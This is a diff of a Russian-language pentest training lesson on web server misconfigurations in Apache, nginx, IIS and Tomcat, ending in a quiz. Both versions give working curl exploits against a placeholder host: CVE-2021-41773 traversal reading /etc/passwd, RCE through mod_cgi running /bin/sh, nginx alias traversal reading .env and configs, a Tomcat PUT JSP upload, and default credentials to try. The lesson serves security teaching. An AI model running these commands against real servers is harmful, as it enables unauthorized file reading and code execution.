@@ -15,303 +15,145 @@ estimated_minutes: 36
 summary: "Ошибки конфигурации веб-серверов: alias traversal, небезопасные location, листинг каталогов, server-status, известные CVE."
 ---
 
-Ошибки конфигурации веб-сервера (Apache/nginx/IIS) — отдельный класс, который часто даёт чтение файлов и обход путей без единой строки уязвимого кода. Классика: `alias`-traversal в nginx, `CVE-2021-41773` в Apache, раскрытие `.htaccess`/`web.config`, directory listing. Это ядро темы `svc-web-server`; здесь — практика по самым результативным конфигам.
+## Вопрос, с которого всё начинается
 
-## nginx: alias traversal
+Ты открыл сайт, потыкал параметры — инъекций нет, авторизация держится, логика в порядке. Тупик? Не совсем.
 
-Если в конфиге `location /files { alias /data/files/; }` **без завершающего слэша** в `location`, то запрос `/files../secret` превращается в `/data/files/../secret` — обход каталога:
+Прежде чем ломать **приложение**, стоит посмотреть на **сервер**, который его отдаёт. Ошибки в конфигурации Apache, nginx или IIS иногда позволяют читать файлы или выполнять команды вообще без единой строки уязвимого кода приложения. Сегодня мы найдём такую ошибку на одном примере: от заголовка `Server` до чтения `/etc/passwd`.
 
-```nginx
-location /static {
-    alias /var/www/static/;   # безопасно (слэш есть)
-}
-location /files {
-    alias /var/www/;          # УЯЗВИМО, если location без слэша
-}
-```
+## Данные, с которыми работаем
 
-Эксплуатация:
+Наш пример — сайт `app.example`. Первым делом узнаём, что за сервер его отдаёт. Версию часто пишут прямо в заголовке ответа:
 
 ```bash
-curl -s --path-as-is "https://app.example/files../etc/passwd"
-curl -s --path-as-is "https://app.example/files../app/config.php"
+$ curl -sI https://app.example/ | grep -i '^server:'
+Server: Apache/2.4.49 (Unix)
 ```
 
-`--path-as-is` обязателен: curl по умолчанию нормализует `..`.
+`Server: Apache/2.4.49` — это и есть точная версия. И тут же красный флаг: **2.4.49** — версия с известной уязвимостью обхода путей (CVE-2021-41773). Точная версия — половина успеха: она сразу даёт список известных проблем.
 
-## nginx: небезопасные location
-
-- `location ~ \.php$ { ... }` + `fastcgi_split_path_info` без проверки — исполнение загруженных файлов.
-- `location / { try_files $uri $uri/ /index.php?$args; }` + upload — иногда даёт исполнение.
-- Неверный `merge_slashes`/`internal` — доступ к внутренним локациям.
-- Off-by-slash при `proxy_pass http://backend/` — обход.
-
-## Apache: misconfigs
-
-- **Directory listing** — `Options +Indexes` → перечисление файлов, бэкапы, исходники.
-- **`.htaccess` доступен** — читаем правила/пароли (иногда `AuthUserFile` с хешами).
-- **`server-status`/`server-info`** — `/server-status` открыт → внутренние URL, клиенты.
-- **mod_cgi/mod_cgi-enabled** — исполнение CGI.
-- **`.git`/`.svn` не запрещены** — утечка исходников (см. `web-git-env-exposure`).
-- **CVE-2021-41773/42013** — path traversal + RCE (см. ниже).
-
-## IIS: misconfigs
-
-- **`~` (short name) disclosure** — 8.3-имена файлов; `IIS ShortName Scanner` восстанавливает длинные имена.
-- **`web.config` доступен** — строки подключения, креды.
-- **WebDAV включён** (`PUT`/`MOVE`) — загрузка/перемещение файлов.
-- **`aspnet_client`**, **`trace.axd`** — утечки.
-- **CVE-2017-7269** (WebDAV ScStoragePathFromUrl) — RCE в старых IIS.
-
-## Разобранный пример: Apache CVE-2021-41773
-
-Path traversal в Apache 2.4.49 (и RCE при включённом mod_cgi), 2.4.50 — обход через двойное кодирование.
-
-Шаг 1 — определяем версию (см. `svc-web-server`, `web-tool-httpx-katana`):
+Дополним картину фингерпринтом и хешем иконки (favicon), который узнаёт продукт даже без заголовков:
 
 ```bash
-curl -sI https://app.example/ | grep -i '^Server:'
+$ whatweb -a3 https://app.example | head -1
+Apache[2.4.49], HTTPServer[Unix][Apache/2.4.49]
 ```
 
-Шаг 2 — path traversal (читаем `/etc/passwd`):
+## Пробуем в лоб
+
+Идея простая: заставить сервер отдать файл **вне** корня сайта. Наивный запрос `https://app.example/etc/passwd` не сработает — это просто путь внутри сайта, а не в файловой системе.
+
+Нужно «выйти» из корня через `..`. Но тут мешает сам `curl`: он по умолчанию **нормализует** путь и схлопывает `..`, так что до сервера дойдёт уже «причёсанный» запрос. Поэтому первый шаг — отключить нормализацию флагом `--path-as-is`:
 
 ```bash
-curl -s --path-as-is "https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+$ curl -s --path-as-is "https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" | head -1
+root:x:0:0:root:/root:/bin/bash
 ```
 
-Шаг 3 — RCE через mod_cgi (если включён):
+`.%2e` — это точка, закодированная в URL (`%2e` — символ `.`). В сочетании с `--path-as-is` сервер получает `..` уже после того, как нормализация должна была произойти, и обход срабатывает. Строка `root:x:0:0:...` — это содержимое `/etc/passwd`, файла со списком пользователей системы. Артефакт-доказательство получен: мы читаем файлы, к которым у веба доступа быть не должно.
+
+## Полный прогон: от чтения к выполнению
+
+Чтения `/etc/passwd` иногда мало — хочется выполнить команду. Если в Apache включён `mod_cgi` (модуль, позволяющий запускать скрипты как программы), тот же обход позволяет дотянуться до интерпретатора:
 
 ```bash
-curl -s --path-as-is "https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
-  --data 'echo Content-Type: text/plain; echo; id'
+$ curl -s --path-as-is "https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+>   --data 'echo Content-Type: text/plain; echo; id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Для 2.4.50 обход — двойное кодирование `.%2e`.
+Ответ `uid=33(www-data)` — вывод команды `id` от имени пользователя веб-сервера. Это уже **RCE** (выполнение кода на сервере). Обрати внимание: мы не загружали никаких файлов и не подбирали пароли — только переиспользовали ошибку конфигурации.
 
-## Разобранный пример: nginx alias traversal
+## Если не сработало
 
-Шаг 1 — ищем `location` без слэша: пробуем `/<dir>../` для типичных каталогов (`/static../`, `/files../`, `/assets../`).
+- Версия не 2.4.49, а **2.4.50** — там обход закрыли, но обошли снова через **двойное кодирование**: `%%32%65%%32%65` вместо `.%2e`.
+- Сервер **nginx**, и файлы отдаёт `location /files { alias /var/www/; }` — если в `location` нет завершающего слэша, а в `alias` есть, то запрос `/files../` выходит за каталог:
 
 ```bash
-curl -s --path-as-is "https://app.example/assets../index.php" | head
+$ curl -s --path-as-is "https://app.example/files../etc/passwd"
 ```
 
-Шаг 2 — читаем чувствительные файлы:
+- Сервер **IIS** — попробуй короткие 8.3-имена: `/` превращается в `~1`-нотацию, и сканер short-name восстанавливает имена скрытых файлов.
+- Traversal не работает вообще — ищи не обход путей, а **открытые служебные страницы**: `/server-status`, `/server-info`, `manager/html` (Tomcat), `/actuator/env` (Spring).
 
-```bash
-curl -s --path-as-is "https://app.example/static../.env"
-```
+## Чек-лист: что проверять по приоритету
 
-Шаг 3 — если нашли конфиг/креды — эскалируем (БД/админка).
+Серверный мисконфиг ищут по чек-листу — шесть проверок занимают минуты и покрывают большинство находок:
 
-## Разобранный пример: листинг/утечки
-
-```bash
-curl -s https://app.example/uploads/ | grep -iE 'href='      # directory listing
-curl -s https://app.example/.htaccess
-curl -s https://app.example/web.config
-curl -s https://app.example/server-status
-curl -s https://app.example/phpinfo.php
-```
-
-Каждый открытый артефакт — потенциальный секрет или карта приложения.
-
-## Где искать
-
-- Заголовок `Server:` и версии (Apache/nginx/IIS/Tomcat).
-- Открытые каталоги, `.htaccess`, `web.config`, `server-status`.
-- Конфиги с `alias`/`proxy_pass` (если утекли в git).
-- Загруженные файлы рядом со скриптами (см. `web-file-upload-advanced`).
-
-## Инструменты
-
-- **`nuclei`** — теги `apache`, `nginx`, `iis`, `misconfig` (`nuclei_parse`).
-- **`nikto`** — быстрый чеклист misconfig.
-- **`ffuf`/`gobuster`** — каталоги/бэкапы (см. `web-tool-ffuf`).
-- **`whatweb`/`httpx -tech-detect`** — версии.
-- **`searchsploit`** — CVE под версию.
-
-## Что дальше / decision
-
-1. Определили сервер+версию → ищите CVE (Apache 2.4.49/50, IIS WebDAV).
-2. nginx с `alias`/`proxy_pass` → проверьте `..`-traversal (`--path-as-is`).
-3. Открыт directory listing → соберите файлы/бэкапы.
-4. Нашли `.htaccess`/`web.config`/`server-status` → креды/карта.
-5. Дальше — эскалация через найденные секреты/уязвимые версии.
-
-## Частые ошибки
-
-- **Использовать curl без `--path-as-is`.** `..` нормализуется — traversal не сработает.
-- **Путать alias-traversal с LFI приложения.** Это конфиг сервера.
-- **Не проверять версию.** N-day привязаны к точной версии.
-- **Игнорировать directory listing.** Часто источник исходников.
-- **Ломать прод.** Только чтение/безопасные проверки.
-
-## Фингерпринт сервера: с чего начать
-
-Прежде чем искать misconfig, определите точный сервер и версию.
-
-```bash
-# заголовки и версия
-curl -sI https://app.example/ | grep -iE 'server|x-powered-by|x-aspnet-version'
-# whatweb — общий фингерпринт
-whatweb -a3 https://app.example | tee whatweb.txt
-# nmap http-заголовки
-nmap -p80,443 --script http-headers,http-title,http-server-header app.example
-# favicon-hash — определяет продукт даже без заголовков
-curl -s https://app.example/favicon.ico | mmh3sum
-```
-
-```bash
-# проверка конкретных уязвимых версий
-nuclei -u https://app.example -tags apache,nginx,iis,tomcat -j -silent | tee srv.json
-```
-
-Точная версия (Apache 2.4.49, nginx 1.20, IIS 10) сразу даёт список известных CVE и misconfig.
-
-## Apache: path traversal и CVE
-
-```bash
-# CVE-2021-41773 / CVE-2021-42013 (Apache 2.4.49-2.4.50)
-curl -s --path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
-# если включён mod_cgi — RCE
-curl -s --path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
-  -d 'echo Content-Type: text/plain; echo; id'
-# обход через двойное кодирование
-curl -s --path-as-is 'https://app.example/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
-```
-
-Ключ — `--path-as-is`, иначе curl нормализует `..`. Проверяйте также `mod_negotiation` (multiviews), `.htaccess`-утечки, `server-status`/`server-info`.
-
-## nginx: off-by-slash и alias traversal
-
-```bash
-# off-by-slash: location /static { alias /app/static/; }
-curl -s 'https://app.example/static../app.py'
-# alias traversal: location /i { alias /data/; }
-curl -s 'https://app.example/i../../etc/passwd'
-# утечка конфигов и листинг
-curl -s 'https://app.example/nginx.conf'
-curl -s 'https://app.example/..%2f..%2fetc%2fpasswd'
-```
-
-Причина: `alias` без слэша + отсутствие нормализации. Проверяйте все `location` с `alias`, `root`, `proxy_pass` и `internal`.
-
-## IIS и Tomcat
-
-```bash
-# IIS: короткие имена (tilde), WebDAV, ASP.NET debug
-curl -s 'https://app.example/~1/'            # short-name enumeration
-curl -s 'https://app.example/default.asp::$DATA'
-# Tomcat: manager, host-manager, примеры
-curl -s https://app.example:8080/manager/html
-curl -s https://app.example:8080/examples/
-# Tomcat PUT (CVE-2017-12617) — только при readonly=false
-curl -s -X PUT https://app.example/x.jsp -d '<% out.println(1); %>'
-```
-
-```bash
-# Jenkins script console, Spring actuator
-curl -s https://app.example:8080/script
-curl -s https://app.example/actuator/env | jq .
-```
-
-## Инструменты
-
-| Инструмент | Назначение |
-|-----------|-----------|
-| `whatweb` | фингерпринт стека |
-| `nuclei` | CVE/misconfig-шаблоны |
-| `nikto` | базовый аудит сервера |
-| `ffuf` | перебор путей/файлов |
-| `mmh3sum` | favicon-hash |
-| `nmap --script` | http-* скрипты |
-
-```bash
-# массовый прогон
-nikto -h https://app.example -o nikto.txt
-nuclei -u https://app.example -severity medium,high,critical -j -silent | tee nuc.json
-```
-
-## Что делать дальше / решение
-
-1. **Фингерпринт.** Версия сервера, модули, заголовки.
-2. **Сопоставьте CVE.** По точной версии.
-3. **Проверьте path traversal.** `--path-as-is`, кодировки.
-4. **Проверьте admin/debug.** `server-status`, `manager`, `actuator`, `script`.
-5. **Проверьте листинг/утечки.** `.htaccess`, бэкапы, конфиги.
-6. **Зафиксируйте PoC.** Прочитанный файл / выполненная команда.
-
-## Практика и справочники
-
-- **HackTricks** — «Apache», «nginx», «Tomcat», «IIS».
-- **nuclei templates** — `http/cves/` и `http/misconfiguration/`.
-- **svc-web-server** — серверный playbook.
-- **Vulhub** — стенды Apache/nginx.
-
-## Приоритеты и типовые находки
-
-Серверный misconfig ищут быстро и по чек-листу. Сначала фингерпринт (`whatweb`, `curl -I`, favicon-hash), затем сопоставление точной версии с CVE. Далее — три классических пути: path traversal (Apache `.%2e`, nginx alias, IIS `::$DATA`), открытые админ/дебаг-панели (`server-status`, `manager/html`, `actuator`, `script`) и утечки (листинг, бэкапы, конфиги). Каждая находка почти всегда даёт чтение файлов или RCE без сложной эксплуатации — поэтому серверный слой стоит проверять в первую очередь.
-
-## Кратко
-
-1. Фингерпринт версии → список CVE.
-2. Path traversal (`--path-as-is`, кодировки).
-3. Админ/дебаг-эндпоинты.
-4. Утечки: `.htaccess`, конфиги, бэкапы, листинг.
-5. PoC — прочитанный файл или выполненная команда.
-
-## Практика
-
-- **nuclei** — `http/misconfiguration/`, `http/cves/`.
-- **HackTricks** — Apache/nginx/IIS/Tomcat.
-- **Vulhub** — воспроизводимые стенды.
-
-## Расширенный разбор: что проверять в первую очередь
-
-| Приоритет | Проверка | Признак |
-|-----------|----------|---------|
+| Приоритет | Проверка | Признак успеха |
+|-----------|----------|----------------|
 | 1 | точная версия сервера | известный CVE |
 | 2 | path traversal | чтение `/etc/passwd` |
 | 3 | открытые admin/debug | `server-status`, `actuator` |
 | 4 | листинг директорий | список файлов |
 | 5 | бэкапы/конфиги | `.bak`, `.old`, `.env` |
-| 6 | небезопасные методы | `PUT`, `DELETE` |
+| 6 | опасные методы | `PUT`, `DELETE`, `TRACE` |
+
+Прогоняем их одной серией:
 
 ```bash
-# быстрый проход по приоритетам
-curl -sI https://app.example/ | grep -i server
-curl -s --path-as-is 'https://app.example/icons/.%2e/.%2e/etc/passwd' | head -1
-curl -s -o /dev/null -w '%{http_code}\n' https://app.example/server-status
-curl -s -o /dev/null -w '%{http_code}\n' https://app.example/.env
-curl -s -X OPTIONS -i https://app.example/ | grep -i allow
+$ curl -sI https://app.example/ | grep -i server
+Server: Apache/2.4.49 (Unix)
+$ curl -s -o /dev/null -w 'status=%{http_code}\n' https://app.example/server-status
+status=200
+$ curl -s https://app.example/uploads/ | grep -c 'href='
+7
+$ curl -s -X OPTIONS -i https://app.example/ | grep -i '^allow'
+Allow: GET, POST, PUT, OPTIONS
 ```
 
-Шесть проверок занимают минуты и покрывают большинство серверных misconfig-находок.
+Разрешение `PUT` в строке `Allow` — ещё один вектор: иногда так можно загрузить свой файл. `server-status` вернул `200` — значит, служебная страница открыта и отдаёт внутренние URL и активные запросы.
 
-## Дополнительно: методы и заголовки
+## Другие серверы: Tomcat и IIS
 
-Опасны не только пути. Разрешение `PUT`/`DELETE`/`TRACE` даёт запись файлов или утечку cookie; `TRACE` часто считают безобидным, но он отражает заголовки. Проверяйте также `X-Powered-By` и `Server` на избыточность информации, а `Access-Control-Allow-Origin: *` — на CORS-риск.
+Apache — не единственный. Две классические мишени:
 
-## Ещё одна проверка
+**Tomcat** часто оставляет открытыми служебные приложения `manager` и `examples`:
 
-Не забудьте про HTTP/2 и HTTP/3: некоторые серверы по-разному обрабатывают псевдо-заголовки и downgrade, что даёт обход маршрутизации или smuggling. Проверьте `h2c`-upgrade и заголовки `:path` с закодированными dot-segments. Это особенно актуально для фронт-прокси, которые транслируют h2/h3 в h1.
+```bash
+$ curl -s -o /dev/null -w '%{http_code}\n' https://app.example:8080/manager/html
+401
+$ curl -s -o /dev/null -w '%{http_code}\n' https://app.example:8080/examples/
+200
+```
 
-## Финальная заметка
+`401` на `manager` — это ещё не тупик: менеджер защищён Basic-авторизацией, и дефолтные креды (`tomcat`/`tomcat`, `admin`/`admin`) проверяют в первую очередь. Открытый `examples` сам по себе безобиден, но подтверждает, что служебные приложения не вычищены.
 
-Все перечисленные проверки безопасны (чтение), кроме `PUT`/`DELETE` — их применяйте только с разрешения. Начните с чтения: версия, traversal, листинг, бэкапы. В большинстве случаев уже это даёт файл с секретами или подтверждённую уязвимость, которую можно оформить как PoC.
+**IIS** раскрывает короткие 8.3-имена файлов: запрос `/~1/`-нотации позволяет восстановить имена скрытых файлов, которые в обычном листинге не видны. А `web.config` (аналог `.htaccess`) иногда доступен напрямую и содержит строки подключения к базе.
+
+Инструменты для всего этого: `nikto` (быстрый чек-лист), `nuclei -tags apache,nginx,iis,tomcat` (шаблоны CVE и misconfig), `searchsploit` (эксплойты под точную версию).
+
+## Что мы теперь знаем
+
+- Мисконфиг сервера — отдельный класс: чтение файлов и RCE без уязвимости в коде приложения.
+- Точная версия (`Server:` / favicon-hash) сразу указывает на известные CVE.
+- `--path-as-is` в `curl` обязателен — иначе `..` нормализуется и traversal не дойдёт.
+- `. %2e` и двойное кодирование обходят нормализацию пути.
+- Apache 2.4.49/2.4.50 → path traversal (+RCE при `mod_cgi`).
+- nginx `alias` без слэша → alias traversal; IIS → short-name disclosure.
+- `server-status`, `manager/html`, `actuator` — открытые служебные страницы, часто с секретами.
+
+## На что смотреть дальше
+
+- Всегда определяй точный сервер и версию (`curl -I`, `whatweb`, `nmap --script http-server-header`) — N-day привязаны к версии.
+- Не путай alias-traversal (конфиг сервера) с LFI приложения — это разные слои и разные фиксы.
+- Не забывай про **листинг каталогов** (`Options +Indexes`): открытый `/uploads/` часто отдаёт бэкапы и исходники.
+- Проверяй опасные HTTP-методы: `OPTIONS` покажет разрешённые `PUT`/`DELETE` — иногда это запись файлов.
+- `nuclei -tags apache,nginx,iis,tomcat,misconfig` прогонит десятки таких проверок автоматически.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что такое alias traversal в nginx?"
   options:
     - "Ошибка DNS"
-    - "Выход за каталог через alias без завершающего /"
-    - "Шифрование"
-    - "Кеш"
+    - "Выход за каталог, когда location без завершающего /, а alias с ним"
+    - "Шифрование трафика"
+    - "Кеширование ответов"
   answer: 1
-  explanation: "Неверный location/alias позволяет .."
+  explanation: "Неверная пара location/alias позволяет выйти через .. за каталог."
 - question: "Какая версия Apache уязвима к CVE-2021-41773?"
   options:
     - "2.4.49"
@@ -319,36 +161,40 @@ curl -s -X OPTIONS -i https://app.example/ | grep -i allow
     - "2.2.15"
     - "2.4.1"
   answer: 0
-  explanation: "2.4.49/2.4.50 — path traversal."
-- question: "Что даёт /server-status в Apache?"
+  explanation: "2.4.49 (и 2.4.50 через двойное кодирование) — path traversal."
+- question: "Зачем нужен флаг `--path-as-is` в curl?"
   options:
-    - "Пароли"
-    - "Статус и запросы сервера (утечка)"
-    - "TLS-ключ"
-    - "Исходники"
-  answer: 1
-  explanation: "mod_status раскрывает активность."
-- question: "Зачем --path-as-is в curl?"
-  options:
-    - "Ускоряет"
-    - "Отправляет ../ без нормализации"
-    - "Шифрует"
+    - "Ускоряет запрос"
+    - "Отправляет ../ без нормализации пути"
+    - "Шифрует тело"
     - "Ставит cookie"
   answer: 1
-  explanation: "Иначе curl схлопывает путь."
-- question: "Что раскрывает IIS tilde?"
+  explanation: "Иначе curl схлопывает .. и traversal не срабатывает."
+- question: "Что даёт открытый `/server-status` в Apache?"
+  options:
+    - "Пароли пользователей"
+    - "Статус и активные запросы сервера (утечка внутренних URL)"
+    - "TLS-ключ"
+    - "Исходный код"
+  answer: 1
+  explanation: "mod_status раскрывает активность и внутренние запросы."
+- question: "Что раскрывает IIS tilde (`~`) enumeration?"
   options:
     - "Пароли"
     - "Короткие 8.3-имена скрытых файлов"
-    - "TLS"
-    - "Логи"
+    - "TLS-сертификаты"
+    - "Логи доступа"
   answer: 1
-  explanation: "Short filename enumeration."
+  explanation: "Short filename enumeration восстанавливает имена файлов."
 ```
+
+## Куда дальше
+
+В следующем уроке мы поднимемся на уровень выше — к **API** и посмотрим на три главных класса API-уязвимостей: BOLA, BFLA и mass assignment. А пока главное запомни: прежде чем ломать приложение, посмотри на сервер — версия в заголовке часто стоит дороже целого дня фаззинга.
 
 ## Где пригодится
 
-- **CTF (Web):** задачи на миссконфиг сервера.
-- **Bug bounty:** traversal/утечки сервера.
-- **Пентест:** аудит инфраструктуры.
-- **Работа (AppSec/DevOps):** корректные location/alias, отключение листинга/статуса, обновление серверов.
+- **CTF (Web):** задачи на мисконфиг сервера (traversal, статус, листинги).
+- **Bug bounty:** path traversal и утечки сервера — валидные high/critical.
+- **Пентест:** аудит инфраструктуры и точных версий (N-day).
+- **Работа (AppSec/DevOps):** корректные `location`/`alias`, отключение листинга/статуса, своевременные обновления.
